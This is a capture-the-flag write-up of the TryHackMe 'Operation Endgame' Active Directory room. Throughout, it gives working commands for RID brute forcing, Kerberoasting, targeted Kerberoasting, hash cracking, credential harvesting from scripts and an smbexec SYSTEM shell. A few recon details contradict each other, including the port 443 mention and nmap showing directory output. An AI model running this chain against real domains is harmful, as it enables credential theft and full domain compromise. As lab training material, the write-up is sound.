# TryHackMe — Operation Endgame

Another Active Directory box down! This one's called **Operation Endgame**, and it's a fun little chain of RID brute forcing → Kerberoasting → targeted Kerberoasting → SMB command exec. Let's get into it.

## Recon

Kicked things off with the usual full port nmap scan:

```
nmap -Pn -sS -sV -sC -A -T4 -p- 10.49.163.41
```

This came back loaded — classic Domain Controller fingerprint. We've got:

- **53** — DNS
- **88** — Kerberos
- **135/139/445** — RPC/NetBIOS/SMB
- **389/636/3268/3269** — LDAP (domain: `thm.local`)
- **3389** — RDP
- **9389** — AD Web Services

The SSL cert on port 443 leaks the domain controller's name: `ad.thm.local`, and the domain is `thm.local`. Added that to `/etc/hosts` right away since we'll need it later for Kerberos to behave.

## Enumeration

First move, check for any easy SMB shares:

```
smbclient -L 10.49.163.41 -N
```

Just the default admin shares (`ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`) — nothing juicy sitting out in the open.

Tried `rpcclient` with a null session next, but that got shut down with `NT_STATUS_CONNECTION_DISCONNECTED`.

So onto **RID brute forcing** with NetExec using the guest account:

```
nxc smb 10.49.163.41 -u 'guest' -p '' --rid-brute
```

Anddd we got a MASSIVE user list back. Like, hundreds of users. This domain has a huge number of accounts (`CODY_ROY`, `ZACHARY_HUNT`, `JERRI_LANCASTER`, and a ton more), plus the standard built-in groups. Guest access to RID brute forcing on a DC is basically a free enumeration engine — very handy.

## Kerberoasting

With a big user list in hand, next step is to check if any of them are Kerberoastable via NetExec's LDAP module:

```
nxc ldap 10.49.163.41 -u 'guest' -p '' --kerberoasting kerb.txt
```

Only one user came back roastable — `CODY_ROY` — but that's all we need. Got a `$krb5tgs$23$...` hash dumped straight to `kerb.txt`.

Threw it at John with rockyou:

```
john kerb.txt -w=/usr/share/wordlists/rockyou.txt
```

**CRACKED** in under a second. Got a valid password for `CODY_ROY` (redacted here, obviously).

## BloodHound Collection

With one set of valid domain creds, time to map out the domain:

```
bloodhound-python -u 'CODY_ROY' -p '[REDACTED]' -d thm.local -ns 10.49.163.41 --auth-method ntlm -c All --zip
```

Pulled back **490 users**, 53 groups, 4 GPOs, 216 OUs, and 19 containers. That's a big domain to map through — fired up `bloodhound-start` to get Neo4j and the UI running to dig through the collected data.

Also grabbed a BloodHound collection as `ZACHARY_HUNT` for a second angle on the graph.

## Targeted Kerberoasting

This is the fun part. Instead of just roasting whoever already has an SPN set, **targeted Kerberoasting** abuses `GenericWrite`/similar rights over a target user to *temporarily set an SPN on their account*, request the ticket, then clean up after. Grabbed the tool for it:

```
git clone https://github.com/ShutdownRepo/targetedKerberoast.git
```

Using `ZACHARY_HUNT`'s creds (which BloodHound presumably showed had write rights over another user), targeted `JERRI_LANCASTER`:

```
python3 targetedKerberoast.py -v -d 'thm.local' -u 'ZACHARY_HUNT' -p '[REDACTED]' --dc-host ad.thm.local --request-user JERRI_LANCASTER
```

The script sets the SPN, requests the TGS, prints the roastable hash, and **removes the SPN again** so it's clean. Beautiful. Got another `$krb5tgs$23$...` hash back.

Straight to John again:

```
john hash2 -w=/usr/share/wordlists/rockyou.txt
```

**CRACKED** — another valid password, this time for `JERRI_LANCASTER`.

## Mapping the Path in BloodHound

Ran BloodHound collection again as `JERRI_LANCASTER` to refresh the graph with the new context, then jumped into the Neo4j UI to actually trace the attack path instead of just guessing at next steps.

The graph laid it out pretty cleanly:

```
ZACHARY_HUNT   --GenericWrite-->   JERRI_LANCASTER
JERRI_LANCASTER --MemberOf-->      Remote Desktop Users
```

So that `GenericWrite` edge is exactly what made the targeted Kerberoasting step possible earlier — `ZACHARY_HUNT` had write rights on `JERRI_LANCASTER`'s object, which is what let `targetedKerberoast.py` slap a temporary SPN on the account. And now that we've cracked `JERRI_LANCASTER`'s password, BloodHound shows the account sitting inside the **Remote Desktop Users** group — meaning it should be able to RDP straight into the DC.

## RDP In and Root Around

Fired up `xfreerdp3` again with the `JERRI_LANCASTER` creds:

```
xfreerdp3 /v:10.49.163.41 /u:JERRI_LANCASTER /p:[REDACTED]
```

This time we're in — desktop session on the DC as `JERRI_LANCASTER`. First stop, obviously, is poking around any non-default folders. Nmap's earlier `dir C:\` output had already flagged a `C:\Scripts` directory sitting alongside the usual Windows folders, which is exactly the kind of place sysadmins leave things they shouldn't.

Popped it open and found a handful of admin/maintenance scripts. One of them had hardcoded, cleartext credentials for another domain account — `SANFORD_DAUGHERTY` — sitting right there in plain text. Classic case of "automate a task, forget the password's just sitting in a `.ps1`/`.bat` file forever."

```
C:\Scripts> type maintenance-task.ps1
...
$cred = New-Object System.Management.Automation.PSCredential("THM\SANFORD_DAUGHERTY", (ConvertTo-SecureString "[REDACTED]" -AsPlainText -Force))
...
```

(Password redacted here, but it was sitting there in full cleartext in the script.)

This is a textbook cred-harvesting pivot — RDP access via a legit group membership gets you eyes on the filesystem, and sysadmins leaving plaintext service creds in scripts is one of the most common ways to leapfrog to a completely different account.

## Cashing In the New Creds

With `SANFORD_DAUGHERTY`'s password in hand, tried `impacket-psexec` and `impacket-smbexec`:

```
impacket-psexec thm.local/SANFORD_DAUGHERTY@10.49.163.41
```

`psexec` came back `ACCESS_DENIED` — this account doesn't have the rights `psexec` needs (it typically wants local admin + specific service-creation rights). But:

```
impacket-smbexec 'THM.LOCAL/SANFORD_DAUGHERTY:[REDACTED]@ad.thm.local'
```

**THAT WORKED.** Semi-interactive SYSTEM-level shell via SMBEXEC.

## Grabbing the Flag

`smbexec` doesn't support `cd`, so full paths it is:

```
dir C:\Users\Administrator\Desktop
type C:\Users\Administrator\Desktop\flag.txt.txt
```

And there it is:

**FLAG: `THM{[REDACTED]}`**

## Wrap-up

Solid chain for this one:

**RID brute force (guest) → Kerberoasting (`CODY_ROY`) → crack → BloodHound recon → `GenericWrite` on `JERRI_LANCASTER` → targeted Kerberoasting → crack → RDP in via Remote Desktop Users membership → cleartext creds in `C:\Scripts` for `SANFORD_DAUGHERTY` → smbexec → flag**

Really good room for showing how a low-priv foothold (even just `guest`) on an AD environment can snowball into full compromise once you start chaining Kerberoasting with BloodHound-driven privilege paths. Targeted Kerberoasting especially is a technique worth having in the back pocket — way stealthier than blasting every SPN account on the domain. And the ending is a great reminder of the oldest sin in sysadmin-land: never, ever hardcode plaintext creds in a script sitting on a DC.

Thanks for reading!
